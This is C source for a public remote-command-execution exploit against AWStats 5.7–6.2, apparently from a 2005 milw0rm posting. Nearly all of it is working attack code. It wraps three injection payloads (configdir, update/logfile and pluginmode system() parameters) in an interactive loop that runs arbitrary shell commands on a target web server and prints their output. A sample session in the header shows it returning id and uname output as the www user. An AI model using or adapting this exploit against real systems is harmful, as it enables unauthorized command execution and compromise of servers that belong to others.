/*
 * Awstats exploit "shell" 
 * code by omin0us
 * omin0us208 [at] gmail [dot] com
 * dtors security group
 * .:( http://dtors.ath.cx ):.
 *
 * Vulnerability reported by iDEFENSE
 * pluginmode bug has been found by GHC team.
 *
 * The awstats exploit that was discovered allows
 * a user to execute arbitrary commands on the 
 * remote server with the privileges of the httpd 
 *
 * This exploit combines all three methods of exploitation
 * and acts as a remote "shell", parsing all returned 
 * data to display command output and running in a loop
 * for continuous access.
 * 
 * bash-2.05b$ awstats_shell localhost                                     
 * Awstats 5.7 - 6.2 exploit Shell 0.1
 * code by omin0us
 * dtors security group
 * .: http://dtors.ath.cx :.
 * --------------------------------------
 * select exploit method:
 *        1. ?configdir=|cmd}
 *        2. ?update=1&logfile=|cmd|
 *        3. ?pluginmode=:system("cmd");
 *
 * method [1/2/3]? 1
 * starting shell...
 * (ctrl+c to exit)
 * sh3ll> id
 * uid=80(www) gid=80(www) groups=80(www)
 * DTORS_STOP
 * sh3ll> uname -a
 *
 * FreeBSD omin0us.dtors.ath.cx 4.8-RELEASE FreeBSD 4.8-RELEASE #3: Mon Oct 11 
 * 19:34:01 EDT 2004     omin0us@localhost:/usr/src/sys/compile/DTORS  i386
 * DTORS_STOP
 * sh3ll>
 *
 * this is licensed under the GPL
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 80
#define CMD_BUFFER 512
#define IN_BUFFER 10000
#define MAGIC_START "DTORS_START"
#define MAGIC_STOP  "DTORS_STOP"

void usage(char *argv[]);

int main(int argc, char *argv[]){

	FILE *output;
	int sockfd;
	struct sockaddr_in addr;
	struct hostent *host;
	char *host_name=NULL, *awstats_dir=NULL;
	char cmd[CMD_BUFFER], cmd_url[CMD_BUFFER*3], incoming[IN_BUFFER], tmp, c, cli_opt;
	int i, j, flag, method, verbose=0;

	
	if(argc < 2){
		usage(argv);
	}
	
	printf("Awstats 5.7 - 6.2 exploit Shell 0.1\n");	
	printf("code by omin0us\n");
	printf("dtors security group\n");
	printf(".: http://dtors.ath.cx :.\n");
    printf("--------------------------------------\n");

	while(1){
		cli_opt = getopt(argc, argv, "h:d:v");

		if(cli_opt < 0)
			break;

		switch(cli_opt){
			case 'v':
				verbose = 1;
				break;
			case 'd':
				awstats_dir = optarg;
				break;
		}
	}

	if((optind >= argc) || (strcmp(argv[optind], "-") == 0)){
		printf("Please specify a Host\n");
		usage(argv);
	}

	if(!awstats_dir){
		awstats_dir = "/cgi-bin/awstats.pl";
	}
	
	printf("select exploit method:\n"
	       "\t1. ?configdir=|cmd}\n"
	       "\t2. ?update=1&logfile=|cmd|\n"
	       "\t3. ?pluginmode=:system(\"cmd\");\n");
	while(method != '1' && method != '2' && method != '3'){
		printf("\nmethod [1/2/3]? ");
		method = getchar();
	}

	printf("starting shell...\n(ctrl+c to exit)\n");
		
	
while(1){
	i=0;
	j=0;
	memset(cmd, 0, CMD_BUFFER);
	memset(cmd_url, 0, CMD_BUFFER*3);
	memset(incoming, 0, IN_BUFFER);
	
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		printf("Error creating socket\n");
		exit(1);
	}

	if((host = gethostbyname(argv[optind])) == NULL){
		printf("Could not resolv host\n");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr = *((struct in_addr *)host->h_addr);

	printf("sh3ll> ");
	fgets(cmd, CMD_BUFFER-1, stdin);
	
	if(verbose)	
		printf("Connecting to %s (%s)...\n", host->h_name, inet_ntoa(*((struct in_addr *)host->h_addr)));

	if( connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != 0){
		printf("Count not connect to host\n");
		exit(1);
	}

	output = fdopen(sockfd, "a");
	setbuf(output, NULL);

	cmd[strlen(cmd)-1] = '\0';
	if(strlen(cmd) == 0){
		cmd[0]='i';
		cmd[1]='d';
		cmd[3]='\0';
	}

	for(i=0; i<strlen(cmd); i++){
		c = cmd[i];
		if(c == ' '){
			cmd_url[j++] = '%';
			cmd_url[j++] = '2';
			cmd_url[j++] = '0';
		}
		else{
			cmd_url[j++] = c;
		}
	}
	cmd_url[j] = '\0';

	if(method == '1'){
		if(verbose){
			printf("Sending Request\n");	
			printf("GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
		}
	
		fprintf(output, "GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
	}

	if(method == '2'){
		if(verbose){
			printf("Sending Request\n");
			printf("GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
		}
		fprintf(output, "GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
	}

	if(method == '3'){
		if(verbose){
			printf("Sending Request\n");
			printf("GET %s?pluginmode=:system(\"echo+%s;%s;echo+%s\"); HTTP/1.0\n"
"Connection: Keep-Alive\n"
"Host: %s\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);
		}
		fprintf(output, "GET %s?pluginmode=:system(\"echo+%s;%s;echo+%s\"); HTTP/1.0\n"
"Connection: Keep-Alive\n"
"Host: %s\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);
	}


	i=0;
	while(strstr(incoming, MAGIC_START) == NULL){
		flag = read(sockfd, &tmp, 1);
		incoming[i++] = tmp;

		if(i >= IN_BUFFER){
			printf("flag [-] incoming buffer full\n");
			exit(1);
		}
		if(flag==0){
			printf("exploitation of host failed\n");
			exit(1);
		}
	}
	
	while(strstr(incoming, MAGIC_STOP) == NULL){
		read(sockfd,&tmp,1);
		incoming[i++] = tmp;
		putchar(tmp);
		if(i >= IN_BUFFER){
			printf("putchar [-] incoming buffer full\n");
			exit(1);
		}
	}
	printf("\n");
	
	shutdown(sockfd, SHUT_WR);
	close(sockfd);
	fclose(output);
	}
	return(0);
}

void usage(char *argv[]){
        printf("Usage: %s [options] <host>\n" , argv[0]);
        printf("Options:\n");
        printf("    -d <awstats_dir>     directory of awstats script\n");
        printf("                         '/cgi-bin/awstats.pl' is default\n");
        printf("                         if no directory is specified\n\n");
        printf("    -v                   verbose mode (optional)\n\n");
        printf("example: %s -d /stats/awstats.pl website.com\n\n", argv[0]);
        exit(1);
}	

// milw0rm.com [2005-03-02]
